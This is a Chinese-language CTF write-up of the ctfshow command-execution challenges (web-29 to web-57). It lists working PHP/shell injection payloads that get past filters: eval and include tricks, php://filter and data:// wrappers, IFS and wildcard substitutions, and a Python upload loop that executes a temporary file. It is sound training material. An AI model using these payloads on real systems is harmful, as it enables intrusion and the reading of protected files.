---
title: ctfshow 命令执行
date: 2024-10-08 20:11:50
tags: 
      - rce
      - ctfshow
categories: 学习笔记
---

### web-命令执行

### web-29

观察代码，发现过滤了flag，我们使用模糊匹配

?c=system("cat fla*");

就能得到flag了。

![image-20240424162512458](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241625523.png)

------

### web-30

观察代码可知，该题过滤了flag，system和php

我们可以使用passthru代替system

?c=passthru("cat fla*");就能得到flag了

![image-20240424162720192](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241627224.png)

------

### web-31

观察代码，发现过滤了flag，system，php，cat，sort，shell，\.,空格，単引号，因此，我们可以进行重造

变量

?c=eval($_GET[1]);&1=system('nl flag.php');

![image-20240424164628726](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241646814.png)

页面回显1，说明重造成功，查看源码，发现flag

![image-20240424164717613](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241647646.png)

------

### web-32

观察代码，发现过滤了更多的东西

![image-20240424185740157](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241857232.png)

因此这题可以通过文件包含和变量覆盖来写

```
payload：?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

$_GET[1]不加括号是因为，include把\$__GET[1]当做一个变量来看，变量的内容由1来确定

1=php://filter/convert.base64-encode/resource=flag.php是通过get请求传入的参数，内容是一个文件包含，以base64形式返回

![image-20240424190343055](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241903101.png)

flag在将base64解码就能看到了

------

### web-33

观察代码，发现这道题比上一道题过滤了一样的东西，因此，这道题可以用上一题的题解写。

但我们换种方法，我们使用data://伪协议

payload：?c=include$_GET[1]?>&1=data://text/plain,<?php%20system("nl%20flag.php");?>

![image-20240424190935358](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241909381.png)

页面回显1，说明代码成功执行，查看源码就能得到flag

------

### web-34-36

跟前两个题做法一模一样

------

### web-37

观察代码，发现一个include可知，该题需要使用文件包含，由于该题过滤了flag，它包含的数据流需转换成base64编码来改写

![image-20240424194040157](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241940177.png)

```
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
```

flag在源码里

注意：当data://text/plain后面接的不是base64编码，就使用逗号隔开

​			当data://text/plain后面为base64编码，就要使用分号隔开，再加上base64和base64编码

------

### web-38

在上题的基础上过滤了php和file，我们依旧使用上一题的payload就能得到flag

![image-20240424194006862](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241940888.png)

------

### web-39

查看源码，发现$c后面拼接了.php，拼接的php可以不用管,include只会处理内部的内容

```
payload：?c=data://text/plain,<?php%20system("cat%20fla*");?>
```

------

### web-40（暂时）

不懂

payload：echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));

payload：show_source(next(array_reverse(scandir(pos(localeconv()))))); 

------

### web-41（暂时）

用脚本写，暂时不会

https://blog.csdn.net/miuzzx/article/details/108569080

------

### web-42

查看源码，发现eval里有个/dev/null 2>&1

/dev/null 2>&1：让所有的输出流（包括错误的和正确的）都定向到空设备丢弃

所以我们不能让后面执行，需要把后面截断，我们使用**%0a(换行),%26（&）,||**

```
payload：?c=cat flag.php %26
```

![image-20240424205927150](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404242059179.png)

------

### web-43

相对上一题，过滤了cat，我们使用tac来代替cat，

```
payload：?c=tac flag.php %26
```

------

### web-44

这题跟上题类似，但过滤了flag，因此我们构造payload

```
?c=tac f\lag%0a
```

------

### web-45

多过滤了一个空格

```
paylo?c=tac%09fl*%26
```

------

### web-46

该题过滤了空格和0-9，$,*,因此这题就不能使用url编码了，但我们可以使用||绕过

```
payload：?c=tac<fl\ag.php||
```

------

### web-47

这道题过滤了更多的文件读取命令，但还是没有过滤tac，因此

```
payload：?c=tac<fl\ag.php||
```

------

### web-48

额，这题依旧没过滤tac

```
payload：?c=tac<fl\ag.php||
```

------

### web-49

嗯，依旧没过滤

页面进行get请求时都会进行url解码再传参的

```
payload1:c=nl%09fla\g.php||
payload2:c=nl%09fla\g.php%0a
payload3:c=nl%09fla''g.php%0a
payload4:c=nl%09fla""g.php%0a
payload5:c=vi%09fla\g.php%0a
payload6:c=tac%09fla\g.php%0a
payload7:c=uniq%09fla\g.php%0a
payload8:c=nl<fla''g.php||
payload9:c=nl%09fla\g.php%26
```

------

### web-50

我们依旧可以用tac来绕过

```
payload：?c=tac<fl\ag.php||
```

------

### web-51

这题把tac过滤了，我们可以使用nl来进行绕过

```
?c=nl<fl\ag.php||
```

------

### web-52

这道题的<和>被过滤了，但$没有被过滤，我们可以使用\${IFS}来代替空格

```
payload: ?c=nl${IFS}fl\ag.php
```

------

### web-53

跟上题做法一样

```
payload1:c''at${IFS}fla''g.p''hp
payload2:c=nl$IFS\fla\g.php

```

------

### web-54

这道题加强了正则表达式

![image-20240425202337926](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404252023965.png)

```
例如.*c.*a.*t.*
就是匹配所有包含cat的字符串（不区分顺序）
```

用模糊匹配绕过

```
payload：?c=/bin/c??${IFS}????????
```

### web-55

**payload1**

利用bin目录

```
bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等
这里我们可以利用 base64 中的64 进行通配符匹配 即 /bin/base64 flag.php
```

使用base64对flag.php进行加密同时使用?绕过字母限制



**payload2**

利用/user/bin目录

```
主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、newaliases、nslookup passwd、quota、smb*、wget等。
我们可以利用/usr/bin下的bzip2 意思就是说我们先将flag.php文件进行压缩，然后再将其下载
```

先c=/???/???/????2 ????.???

然后在url+ flag。php。bz2下载文件



**payload3**

无字母数字shell

无字母数字webshell之提高篇

shell下可以利用.来执行任意脚本

可以通过发送一个上传文件的POST包，只要是php接收到上传的POST请求(请求结束后会删除临时文件)，就

会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的

大小写字母以及数字

写一个post上传表单

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://99da1d95-7eb6-468a-b044-cf1b1b5b393d.challenge.ctf.show/" method="post" enctype="multipart/form-data">
    <!--目标网址-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>

```

构造POC
**注：shell程序必须以"#!/bin/sh"开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径**

![在这里插入图片描述](https://img-blog.csdnimg.cn/62340463ed224d4a9b05d03d80da2c72.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5LiAYXVl,size_20,color_FFFFFF,t_70,g_se,x_16)

```
?c=./???/????????[@-[]
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/28f9e75bfe0947e882d8e719947447b0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5LiAYXVl,size_20,color_FFFFFF,t_70,g_se,x_16)



payload 4

运行下面脚本

```
import requests

while True:
    url = "http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]"
    r = requests.post(url, files={"file": ('feng.txt', b'cat flag.php')})
    if r.text.find("flag") > 0:
        print(r.text)
        break

```



### web 56

因为过滤掉了数字，所以web55前两个方法都不行了。

还是用上传文件的方法

### web57

```
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}
```


 利用linux的$​(())构造出36

$(())=0

\$((~ $(()) ))=-1

(())是用来整数运算的命令，内部可以放表达式，默认相加，通过$((~36)) 可得36取反为-37

 36可以通过外层为$(())包裹内层可以运算出36的表达式构造，36由-37取反得到，所以

\$((~$((   ))))   内部加上37个$((~ $(()) )) 得到 -37 。

再捋一遍就是：
题目要读取36.php，先对36取反，可以知道36可以由-37取反得到，-37又可以拆成37个 -1 相加也就是37个$((~$(( ))))，再在外面取反(也就是对-37取反)就可以得到36

最终payload:

```
?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))) ))))
```



#### 知识点

> 
>
> 1、双小括号：（（））
>
> 双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。
>
> 还要知道$(())的值是0
>
> 2、取反：
>
> 如果b=~a，那么a+b=-1。可以用二进制验算 
>
> ![img](https://img-blog.csdnimg.cn/20210831092105318.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVFQxM1VH,size_20,color_FFFFFF,t_70,g_se,x_16)
>
> 3、echo ${_} #返回上一次的执行结果

![img](https://img-blog.csdnimg.cn/20210831092201573.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVFQxM1VH,size_20,color_FFFFFF,t_70,g_se,x_16)
